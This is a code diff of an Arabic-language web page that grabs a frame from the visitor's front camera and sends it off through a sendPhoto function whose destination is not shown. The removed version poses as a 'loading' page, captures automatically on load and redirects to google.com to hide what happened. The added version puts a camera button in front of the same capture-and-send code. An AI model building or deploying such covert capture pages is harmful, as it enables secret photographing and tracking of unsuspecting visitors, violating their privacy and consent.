@@ -2,10 +2,13 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جارٍ التحميل...</title>
+  <title>تشغيل الكاميرا</title>
 </head>
-<body>
-  <h3>جارٍ تحميل الصفحة...</h3>
+<body style="background:#222;color:#fff;text-align:center;padding-top:40px;">
+
+  <h2>اضغط الزر لتشغيل الكاميرا 📸</h2>
+  <button onclick="startCamera()" style="padding: 15px 30px; font-size: 18px;">تشغيل الكاميرا</button>
+
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -25,39 +28,42 @@
       });
     }
 
-    async function captureAndSendCameraImage() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // الكاميرا الأمامية
-        });
+    function captureImageFromCamera(stream) {
+      const video = document.getElementById('video');
+      video.srcObject = stream;
 
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
 
-        // انتظر شوي حتى تشتغل الكاميرا
         setTimeout(() => {
           const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // أوقف الكاميرا
           stream.getTracks().forEach(track => track.stop());
 
           const base64Image = canvas.toDataURL("image/jpeg");
           sendPhoto(base64Image).then(() => {
-            window.location.href = "https://google.com";
+            alert("📷 تم التقاط الصورة وإرسالها ✅");
           });
 
         }, 3000); // انتظر 3 ثواني
-      } catch (err) {
-        alert("فشل الوصول للكاميرا: " + err);
-        window.location.href = "https://google.com";
-      }
+      };
     }
 
-    window.onload = captureAndSendCameraImage;
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" } // الكاميرا الأمامية
+        });
+        captureImageFromCamera(stream);
+      } catch (err) {
+        alert("❌ فشل الوصول إلى الكاميرا: " + err.message);
+      }
+    }
   </script>
+
 </body>
 </html>
